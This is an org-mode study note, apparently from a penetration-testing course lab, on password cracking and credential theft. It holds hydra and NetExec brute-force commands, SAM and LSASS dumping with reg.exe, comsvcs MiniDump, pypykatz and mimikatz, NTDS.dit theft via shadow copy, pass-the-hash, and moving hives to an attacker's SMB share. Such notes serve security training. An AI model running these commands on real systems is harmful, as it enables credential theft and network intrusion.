:PROPERTIES:
:ID:       95f92876-30b5-486d-91a9-33ab28ed9357
:END:
#+title: password attacks
#+OPTIONS: toc:3 ^:{}


* TOC :toc_3:
- [[#cracking-techniques][Cracking Techniques]]
    - [[#rainbow-tables][Rainbow Tables]]
    - [[#dict-attacks][Dict Attacks]]
    - [[#brute-force][Brute Force]]
  - [[#john-the-ripper][John The Ripper]]
    - [[#cracking-modes][Cracking modes]]
    - [[#hash-formats][Hash Formats]]
    - [[#cracking-files][Cracking Files]]
  - [[#hashcat][HashCat]]
    - [[#hash-types][Hash Types]]
    - [[#attack-modes][Attack Modes]]
  - [[#custom-wordlists--rules][Custom Wordlists & Rules]]
    - [[#most-common-password-policies][Most Common Password policies]]
    - [[#creating-rules][Creating rules]]
    - [[#lab][LAB]]
  - [[#cracking-protected-files][Cracking Protected Files]]
    - [[#hunting-for-encrypted-files][Hunting for Encrypted Files]]
    - [[#hunting-for-ssh-keys][Hunting for SSH Keys]]
    - [[#cracking-encrypted-ssh-keys][Cracking encrypted SSH keys]]
    - [[#cracking-password-protected-docs][Cracking password protected docs]]
  - [[#cracking-protected-archives][Cracking Protected Archives]]
    - [[#zip][ZIP]]
    - [[#openssl-encrypted-gzip][OpenSSL encrypted GZIP]]
    - [[#cracking-bitlocker-encrypted-devices][Cracking Bitlocker encrypted devices]]
- [[#remote-password-attacks][Remote Password attacks]]
  - [[#network-services][Network Services]]
    - [[#winrm][WinRM]]
    - [[#ssh][SSH]]
    - [[#rdp][RDP]]
    - [[#smb][SMB]]
  - [[#password-spraying][Password Spraying]]
  - [[#credential-stuffing][Credential Stuffing]]
  - [[#default-creds][Default creds]]
- [[#extracting-passwords-windows][Extracting Passwords (Windows)]]
  - [[#windows-authentication-process][Windows Authentication Process]]
    - [[#lsass][LSASS]]
    - [[#sam-db][SAM DB]]
    - [[#credential-manager][Credential Manager]]
    - [[#ntds][NTDS]]
  - [[#attacking-sam-system-security][Attacking SAM, SYSTEM, SECURITY]]
    - [[#registry-hives][Registry Hives]]
    - [[#dumping-hashes][Dumping Hashes]]
    - [[#cracking-hashes-hashcat][Cracking hashes (hashcat)]]
    - [[#dcc2-hashes][DCC2 hashes]]
    - [[#dpapi][DPAPI]]
    - [[#remote-dumping--lsa-secrets-considerations][Remote dumping & LSA secrets considerations]]
  - [[#attacking-lsass][Attacking LSASS]]
    - [[#dumping-lsass-process-mem][Dumping LSASS process mem]]
    - [[#extract-creds---pypykatz][Extract Creds -> Pypykatz]]
  - [[#attacking-windows-credential-manager][Attacking Windows Credential Manager]]
    - [[#windows-vault--credential-manager][Windows Vault & Credential Manager]]
    - [[#enumerating-creds-w-cmdkey][Enumerating creds w cmdkey]]
    - [[#extracting-w-mimikatz][Extracting w Mimikatz]]
  - [[#attacking-active-directory--ntdsdit][Attacking Active Directory & NTDS.dit]]
    - [[#active-directory][Active Directory]]
    - [[#dict-attacks-against-ad-using-netexec][Dict attacks against AD using NetExec]]
    - [[#capturing-ntdsdit][Capturing NTDS.dit]]
    - [[#cracking-hashes--gaining-credentials][Cracking Hashes & Gaining Credentials]]
    - [[#pass-the-hash-considerations][Pass the Hash Considerations]]
  - [[#credential-hunting][Credential Hunting]]
    - [[#search-centric][Search-Centric]]
    - [[#search-tools][Search Tools]]
    - [[#additional-considerations][Additional Considerations]]
- [[#extracting-passwords-from-linux-systems][Extracting Passwords from Linux Systems]]
  - [[#linux-authentication-process][Linux Authentication Process]]
    - [[#passwd-file][Passwd file]]
    - [[#shadow-file][Shadow File]]
    - [[#opasswd][Opasswd]]
    - [[#cracking-linux-creds][Cracking linux Creds]]
  - [[#credential-hunting-in-linux][Credential Hunting in Linux]]
    - [[#files][Files]]
    - [[#memory--cache][Memory & Cache]]
  - [[#credential-hunting-in-network-traffic][Credential Hunting in Network Traffic]]
    - [[#wireshark][Wireshark]]
    - [[#pcredz][Pcredz]]

* Cracking Techniques
- passwords commonly hashed when stored

***** Hashing
- mathematical function which transforms arbitrary number of i/p bytes into fixed size o/p (~MD5~, ~SHA-256~)
- designed to work in 1 direction

****** Techniques to crack passwords
******* Rainbow Tables -> [[*Rainbow Tables][Rainbow Tables]]
******* Dict attacks -> [[*Dict attacks][Dict Attacks]]
******* Brute Forcing -> [[*Brute Force][Brute Force]]

*** Rainbow Tables
- large precompiled maps of I/O values for given hash function
- used to quickY ID pass if corresponding hash has already been mapped

***** Salting
- =salt= -> random sequence of bytes added to password before it is hashed.
- salt usually prepended, not a secret value because system has to know what salt was used to check password hash
- even if correct password has been mapped, combination of salt & pass has likely not

*** Dict Attacks
- =Wordlist= attack
- one of the most efficient techniques for cracking passwords

*** Brute Force
- attempting every possible combination of chars until correct pass discovered.
- can take very long time.

** John The Ripper
- brute-force & dict attacks

*** Cracking modes
**** Single Cracking Mode
- rule-based cracking -> linux creds
- generates passwords based on victim's username, homedir name, =GECOS= values (full name, room num, phone num)
- ~john --single passwd~
**** Wordlist Mode
- used to crack passwd w dict attack
- ~john --wordlist=<wordlist> <hash_file>~
**** Incremental mode
- powerful brute-force.
- generates passwd based on =Markov Chains=
- designed to test all char combinations defined by specific char set
- prioritises more likely passwds based on training data
- ~john --incremental <hash_file>~
  
*** Hash Formats
- [[https://openwall.info/wiki/john/sample-hashes][JtR's sample hash documentation]]
- [[https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats][PentestMonkey]]
- hashID -> use ~-j~ to also get corresponding JTR format

|-----------------+-----------------------------------------------------|
| afs             | AFS (Andrew File System) password hashes            |
| bfegg           | bfegg hashes used in Eggdrop IRC bots               |
| bf              | Blowfish-based crypt(3) hashes                      |
| bsdi            | BSDi crypt(3) hashes                                |
| crypt           | Traditional Unix crypt(3) hashes                    |
| des             | Traditional DES-based crypt(3) hashes               |
| dmd5            | DMD5 (Dragonfly BSD MD5) password hashes            |
| dominosec       | IBM Lotus Domino 6/7 password hashes                |
| episerver       | EPiServer SID password hashes                       |
| hdaa            | hdaa password hashes used in Openwall GNU/Linux     |
| hmac-md5        | HMAC-MD5 password hashes                            |
| hmailserver     | hMailServer password hashes                         |
| ipb2            | Invision Power Board 2 password hashes              |
| krb4            | Kerberos 4 password hashes                          |
| krb5            | Kerberos 5 password hashes                          |
| LM              | LM (Lan Manager) password hashes                    |
| lotus5          | Lotus Notes/Domino 5 password hashes                |
| mscash          | MS Cache password hashes                            |
| mscash2         | MS Cache v2 password hashes                         |
| mschapv2        | MS CHAP v2 password hashes                          |
| mskrb5          | MS Kerberos 5 password hashes                       |
| mssql05         | MS SQL 2005 password hashes                         |
| mssql           | MS SQL password hashes                              |
| mysql-fast      | MySQL fast password hashes                          |
| mysql           | MySQL password hashes                               |
| mysql-sha1      | MySQL SHA1 password hashes                          |
| netlm           | NETLM password hashes                               |
| netlmv2         | NETLMv2 password hashes                             |
| netntlm         | NETNTLM password hashes                             |
| netntlmv2       | NETNTLMv2 password hashes                           |
| nethalflm       | NEThalfLM password hashes                           |
| md5ns           | MD5 namespace password hashes                       |
| nsldap          | OpenLDAP SHA password hashes                        |
| ssha            | Salted SHA password hashes                          |
| NT              | NT (Windows NT) password hashes                     |
| openssha        | OpenSSH private key password hashes                 |
| oracle11        | Oracle 11 password hashes                           |
| oracle          | Oracle password hashes                              |
| pdf             | PDF password hashes                                 |
| phpass-md5      | PHPass-MD5 password hashes                          |
| phps            | PHPS password hashes                                |
| pix-md5         | Cisco PIX MD5 password hashes                       |
| po              | Sybase SQL Anywhere password hashes                 |
| rar             | RAR (WinRAR) password hashes                        |
| raw-md4         | Raw MD4 password hashes                             |
| raw-md5         | Raw MD5 password hashes                             |
| raw-md5-unicode | Raw MD5 Unicode password hashes                     |
| raw-sha1        | Raw SHA1 password hashes                            |
| raw-sha224      | Raw SHA224 password hashes                          |
| raw-sha256      | Raw SHA256 password hashes                          |
| raw-sha384      | Raw SHA384 password hashes                          |
| raw-sha512      | Raw SHA512 password hashes                          |
| salted-sha      | Salted SHA password hashes                          |
| sapb            | SAP CODVN B (BCODE) password hashes                 |
| sapg            | SAP CODVN G (PASSCODE) password hashes              |
| sha1-gen        | Generic SHA1 password hashes                        |
| skey            | S/Key (One-time password) hashes                    |
| ssh             | SSH password hashes                                 |
| sybasease       | Sybase ASE password hashes                          |
| xsha            | Extended SHA password hashes                        |
| zip             | ZIP (WinZip) password hashes                        |
|-----------------+-----------------------------------------------------|
*** Cracking Files
- =2john tools=
- ~<tool> <file> > file.hash~

** HashCat
- ~hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]~ -> ~-a~ -> =attack mode=, ~-m~ -> =hash type=
- *rules* -> ~/usr/share/hashcat/rules~
*** Hash Types
- [[https://hashcat.net/wiki/doku.php?id=example_hashes][example hashes]]
- ~hashcat -h~

*** Attack Modes

**** Dictionary
- ~-a 0~
- ~hashcat -a 0 -m 0 <hash> <wordlist>~

**** Mask
- ~-a 3~
- brute force
- keyspace explicitly defined by user
- ~hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'~

** Custom Wordlists & Rules
- [[https://academy.hackthebox.com/course/preview/osint-corporate-recon][OSINT: Corporate Recon Module]]

*** Most Common Password policies
1. first letter Upper
2. add num
3. add year
4. add month
5. last character is exclamation mark
6. adding special char


*** Creating rules
1. do nothing - ~:~
2. lower - ~l~
3. upper - ~u~
4. capitalise - ~c~
5. replace x w y - ~sxy~
6. add exclamation at end ~$!~

#+begin_src txt
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
#+end_src

*** LAB 
- combine for 12 char
  - ~hashcat --stdout -a 1 base.txt base.txt > combined.txt~
- extend wordlist
  - ~hashcat --stdout mut_pass.txt -r /usr/share/john/rules/rockyou-30000.rule > final.txt~

** Cracking Protected Files
*** Hunting for Encrypted Files
~for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile Ext: " $ext;find / -name *.ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";done~
*** Hunting for SSH Keys
- pvt keys always begin with ~-----BEGIN [...SNIP...] PRIVATE KEY-----~
- use grep to recursively search for
- to tell if SSH key is encrypted or not, ~ssh-keygen -yf ~/.ssh/id_ed25519~
  - will prompt for passwd if encrypted
*** Cracking encrypted SSH keys
- =ssh2john=
  1. ~ssh2john.py SSH.private > ssh.hash~
  2. ~john --wordlist=<wordlist> ssh.hash~
  3. ~john ssh.hash --show~
*** Cracking password protected docs
- ~office2john.py~
- ~john --wordlist=<wordlist> hash~

** Cracking Protected Archives
*** ZIP
- ~zip2john~
*** OpenSSL encrypted GZIP
- use ~file~ to see if encrypted
 ~for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done~
*** Cracking Bitlocker encrypted devices
- =AES= w 128b/256b key len
- recovery key = 48 digit string generated during setup
- ~bitlocker2john -i <i/p> > <o/p>~ -> ~grep "bitlocker\$0" backup.hashes > backup.hash~
- ~bitlocker2john~ -> 4 different hashes
  - first 2 -> password
  - latter two -> recovery key
- hash -> m 22100 hashcat

#+begin_src bash
biscuitrescue@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
biscuitrescue@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
biscuitrescue@htb[/htb]$ cat backup.hash
#+end_src

**** Mounting
- =dislocker=

- create mnt point
  - ~mkdir -p /media/bitlocker~
  - ~mkdir -p /media/bitlockermount~
    
- configure VHD as =loop device=, decrypt using =dislocker=, mount
  - ~losetup -f -P Backup.vhd~
  - ~dilocker /dev/loop0p2 -u1234qwer -- /media/bitlocker~
  - ~mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount~

* Remote Password attacks
** Network Services
*** WinRM
- based on XML web srv based on =SOAP= (=Simple Object Access Protocol=)
- takes cRe of comms b/w =Web-Based Enterprise Mgmt= (=WBEM=) & =Windows Mgmt Instrumentation= (=WMI=), which can call =Distributed Component Object Model= (=DCOM=)
- port =TCP 5985= (HTTP) / =TCP 5986= (HTTPS)

**** NetExec
- can also be used for SMB, LDAP, MSSQL etc
-

****** Usage
- ~netexec <protocol> <target-ip> -u <user or userlist> -p passwd.list~

**** Evil-WinRM
- efficient communication w WinRM service

****** Usage
- ~evil-winrm -i 10.129.42.197 -u <user> -p <password>~

*** SSH
**** Symmetric Encryption
- same key for enc/dec => key xchange procedure required (DH)
**** Asymmetric Encryption
- pub, pvt keys
**** Hashing
- converts transmitted data into another unique val
- used to confirm authenticity of messages.
- mathematical algo _c_ works only in one dir

****** HYDRA - SSH
~hydra -l user.list -P password.list ssh://<ip>~

*** RDP
- =TCP 3389=

**** Hydra
~hydra -L user.list -P password.list rdp://<ip>~

*** SMB

**** Hydra
- ~hydra -L user.list -P password.list smb://<ip>~

**** Metasploit
- =auxiliary/scanner/smb/smb_login=

**** NetExec
- view avl shares, privileges
- ~netexec smb 10.129.42.197 -u "user" -p "pass" --shares~

** Password Spraying
- brute force -> attempt to use single password accross many diff users
- v effective when users init w default/std pass
- =Burp Suite= -> webapps
- =NetExec= / =Kerbrute= -> AD

** Credential Stuffing
- brute force -> stolen creds from one service attempted on others
- =hydra= -> ~hydra -C user_pass.list ssh://<ip>~

** Default creds
- [[https://github.com/ihebski/DefaultCreds-cheat-sheet][Default Cred Cheatsheet]] -> ~creds search linksys~ (pip install defaultcreds-cheat-sheet)
- [[https://www.softwaretestinghelp.com/default-router-username-and-password-list/][Routers defautlts]]

* Extracting Passwords (Windows)

** Windows Authentication Process
- [[https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication][Windows Client Authentication Process]] involves multiple modules responsible for logon, cred retrieval, verification
- [[https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection][Local Security Authority]] =LSA= -> protected subsystem -> authenticates users, manages local plugins, local security, provides srv for Xlating b/w usernames & SIDs

****** Local Interactive Logon:
- =WinLogon= -> logon process
- =LogonUI= -> logon user interface process
- =LSASS= -> Local Security Authority Subsystem Service
- credential providers
- =SAM= -> Security Accounts Manager / =AD= -> Active Directory

*** LSASS
- comprised of multiple modules
- governs all auth processes
- =%SystemRoot%\System32\Lsass.exe=
- fwds security audit logs to =Event Log=
- [[https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN][Architecture]]
- each interactive session -> separate instance of WinLogon
- =Graphical Identification & Authentication= architecture loaded into process area used by winlogon -> rcvs creds -> invokes authentication interfaces via =LSAlogonUser= fn()

****** Auth Packages
******* Lsasrv.dll
- LSA server service
- enforces policies
- security package manager for LSA
- contains =Negotiate= fn()
******* Msv1_0.dll
- auth pkg -> local machine logons -> don't require custom auth
******* Samsrv.dll
- =SAM= stores local security accs
- enforces locally stored poIcies
- supports APIs
******* Kerberos.dll
- loaded by LSA for Kerberos based auth on machine
******* Netlogon.dll
- Net based logon srv
******* Ntdsa.dll
- Directory System Agent (DSA)
- manages =AD= DB (ntds.dit)
- processes LDAP queries
- replication b/w domain controllers
- loaded on domain ctrl'ers

*** SAM DB
- DB file in windows
- stores user account creds
- authenticate local & remote users
- cryptographic protections
- user passes as hash in registry -> =LM= / =NTLM= hashes
- =%SystemRoot%\system32\config\SAM=
- mounted under =HKLM\SAM=
- viewing/accessing requires =SYSTEM= lvl privileges

****** Workgroup/Domain
- systems can be assigned to Workgroup/Domain at setup
******* Workgroup
- SAM DB handles locally
- all existing users locally stored in DB
******* Domain
- Domain Controller (=DC=) must validTE creds from AD DB (ntds.dit) -> =%SystemRoot%\ntds.dit=

***** to prevent offline cracking of SAM DB
- =SYSKEY= (=syskey.exe=) -> Windows NT 4.0
- partially encrypts SAM file on disk w system gen key

*** Credential Manager
- builtin -> allows users to store & manage creds used to access nwtwork resources, websites, apps
- saved creds stored per user profile in user's =Credential Locker=
- creds encrypted & stored at =PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\=

*** NTDS
- database file which stores AD data:
  * user accounts (username & pass hash)
  * group accounts
  * computer accounts
  * group policy objects

** Attacking SAM, SYSTEM, SECURITY
- admin access to win -> attempt to quickly dump files associated w SAM DB -> transfer to attack host -> begin cracking hashes offline

*** Registry Hives
- can be backed up using =reg.exe=

****** HKLM\SAM
- pass hashes for local user accs.

****** HKM\SYSTEM
- *system boot key* -> used to encrypt SAM DB.
- key req to decrypt hashes

****** HKLM\SECURITY
- contains sens info used by LSA (=cached domain creds=, =cleartext pass=, =DPAPI keys=)

**** Using reg.exe to copy hives
- cmd admin privileges
  
#+begin_src cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.

#+end_src

**** Transferring hives
- create share w smb etc
- ~smbserver.py -smb2support <Share> <mntpt>~
#+begin_src cmd 
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.

#+end_src

*** Dumping Hashes
- =secretsdump=
- ~secretsdump.py -sam same.save -security security.save -system system.save LOCAL~
- ~Dumping local SAM hashes (uid:rid:lmhash:nthash)~

*** Cracking hashes (hashcat)
- ~hashcat -m 1000 <hasfile> <wordlist>~

*** DCC2 hashes
- =hklm\security= -> cached domain logon info -> spefically in form of DCC2 hashes
- local hashes copies of network credential hashes

#+begin_src txt 
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
#+end_src

- much more difficult to crack than NT hash.
- uses PBKDF2
- cannot be used for lateral movement (w Pass-the-Hash etc)
- hashcat mode 2100

~hashcat -m 2100 <hash> <wordlist>~

*** DPAPI
- *Data Protection Application Programming Interface*
- set of APIs in Windows -> enc/dec data blobs on per-user basis.
- can be decrypted manually w manually {=dpapi=, =mimikatz=} & remotely {=DonPAPI=}

***** Apps which DPAPI

****** Internet Explorer
- password form auto completion data

****** Chrome
- password form auto completion data

****** Outlook
- password for email accounts

****** Remote desk Connection
- creds for connections to remotes

****** Credential Manager
- saved Creds for accessing shared resources, Wireless networks, VPNs etc

*** Remote dumping & LSA secrets considerations
- possible to target LSA secrets over network w access to creds w =local admin priv=


**** Remote Dumping LSA secrets
#+begin_src bash
biscuitrescue@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
#+end_src


**** Dumping SAM remotely
#+begin_src bash
biscuitrescue@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
#+end_src

** Attacking LSASS
- [[*LSASS][LSASS]]
- on init logon:
  - cache creds locally in mem
  - create access tokens
  - enforce security policies
  - write to Windows' security log

*** Dumping LSASS process mem
- generate mem dump to extract creds offline using attack host

**** Task Manager mem dump
1. open task man
2. select =processes=
3. click =Local Security Authority Process=
4. =Create dump file=

# creates lsass.DMP in %temp%

**** Rundll32.exe & Comsvcs.dll 
- doesn't require GUI
- modern antivirus tools recognise this as malicious activity

****** Finding LSASS PID in cmd
~tasklist /svc~ -> lsass.exe PID

****** Finding LSASS PID in Powershell
~Get-Process lsass~

***** Creating dump file in PS
~rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full~

*** Extract Creds -> Pypykatz
- impl of mimikatz in python -> runs on linux based attack hosts
- extracts creds from =.dmp= file

**** Running
- ~pypykatz lsa minidump /home/peter/Documents/lsass.dmp~

**** MSV
- authentication pkg
- LSA calls =MSV= to validate logon attempts against SAM DB

**** WDIGEST
- older auth protocol enabled by default in =XP - 8= & =Server 2003 - 2012=
- LSASS caches WDIGEST creds in *cleartext*

**** Kerberos
# Net auth Protocol used by AD/
- domain user accs granted tickets on auth (w AD)
- ticket allows user to access shared resources on network that has been granted access to w/out needing to type creds each time
- LSASS caches passes, ekeys, tickets & pins associated w kerberos

**** DPAPI
- can extract DPAPI *masterkey* for logged on users whose data present in LSASS process mem.
- masterkeys -> decrypt secrets associated w apps using DPAPI

**** Cracking NT hash w Hashcat
~hashchat -m 1000 <hash> <wordlist>~

** Attacking Windows Credential Manager

*** Windows Vault & Credential Manager
- Credential Manager -> since =server 2007 R2= & =Windows 7=
- creds stored in encrypted folders on comp, under user & system profiles:
  - =%UserProfile%\AppData\Local\Microsoft\Vault\=
  - =%UserProfile%\AppData\Local\Microsoft\Credentials\=
  - =%UserProfile%\AppData\Roaming\Microsoft\Vault\=
  - =%ProgramData%\Microsoft\Vault\=
  - =%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\=
- each vault -> =Policy.vpol= w AES keys (128/256) -> protected by DPAPI
- newer versions of windows -> =Credential Guard= -> protect DPAPI master keys by storing them in secured mem enclaves -> =Credential Lockers=
- =Credential Manager= -> user facing API.
- actual encrypted stores are the vault folders.

# possible to export windows Vaults to .crd files via either Control Panel or w the command: 
~keymgr.dll,KRShowKeyMgr~

**** Types of Windows stores
***** Web Credentials 
- associated w websites & online accounts.
- used by Internet Explorer & legacy versions of Edge
***** Windows Credentials
- store login tokens for various services like OneDrive
- creds related to:
  * domain users
  * local net resources
  * services
  * shared dirs
    
*** Enumerating creds w cmdkey
- use =cmdkey= to enumerate credentials stored in current user's profile

#+begin_src PS
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
#+end_src


******* Format
******** Target
- resource/account name the creds are for.
- could be computer, domain name, special identfier
******** Type
- kind of credential
- commonly: 
  - =Generic= -> general creds
  - =Domain Password= -> domain user logons
******** User
- User account associated w credential
******** Persistence
- indicates whether credential is saved persistently on computer
- creds marked w *Local Machine Persistence* survive reboots.
*** Extracting w Mimikatz
1. dump creds from mem using =sekurlsa= module
2. manually decrypt creds using =dpapi= module
#+begin_src PS
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
#+end_src

** Attacking Active Directory & NTDS.dit
*** Active Directory
- once windows system is joined to a domain, it no longer defaults to referencing SAM DB to validate logon requests
- domain joined system will send auth reqs to be validated by domain controller
- logon using local account in SAM DB can do so by specifying hostname of device proceeded by username (=WS01\nameofuser=)
*** Dict attacks against AD using NetExec
**** Generating username list
- =Username Anarchy= -> converts list of real names into common username formats
  - ~./username-anarchy -i /home/ltnbob/names.txt~
**** Enumerating Valid usernames -> Kerbrute
- ~./kerbrute-linux_amd64 userenum --dc <ip> -- domain <domain name> <username list>~
**** Brute force w netexec
~netexec smb <ip> -u <username> -p /usr/share/wordlists/fasttrack.txt~

*** Capturing NTDS.dit
- =NT Directory Services= used w AD to find & organize network resources.
- file stored at =%systemroot%/ntds= on domain controllers ([[fomain ][Forest]])
- =.dit= = *Directory Information Tree*
- primary DB file associated w AD -> stores usernames, pass hashes & other crit schema

**** Connecting to DC with EVIL-WINRM
- ~evil-winrm -i 10.129.201.57 -u <username> -p <pass>~

**** Checking local group membership
#+begin_src PS
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
#+end_src

**** Checking user account privileges including domain
#+begin_src PS
Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
#+end_src

**** Creating Shadow copy of C:
- can use =vssadmin= to copy drive admin chose when installing AD
- VSS -> doesn't need to bring down particular applciation or system down
#+begin_src PS
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
#+end_src

**** Copying NTDS.dit from VSS
#+begin_src PS
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
#+end_src

**** Extracting hashes from NTDS.dit
- ~impacket-secretsdumpo -ntds NTDS.dit -system SYSTEM LOCAL~

**** Netexec -> Faster method to capture NTDS.dit
~netexec smb 10.129.201.57 -u <user> -p <pass> -M ntdsutil~

*** Cracking Hashes & Gaining Credentials

**** Cracking single hash w Hashcat
- ~-m 1000~

 
*** Pass the Hash Considerations
- takes adv of NTLM authentication Protocol to authenticate user using password hash
- ~evil-winrm -i <ip> -u Administrator -H <pass_hash>~

** Credential Hunting

*** Search-Centric
- =what might an IT Admin be doing on a day-to-day basis, which of those tasks may require credentials=

**** Key terms to search for:
- Passwords
- Passphrases
- keys
- Usernames
- User Accounts
- Creds
- Users
- Passkeys
- Configuration
- DBCreds
- DBPasswords
- pwd
- Login
- Credentials

*** Search Tools

**** Windows Search
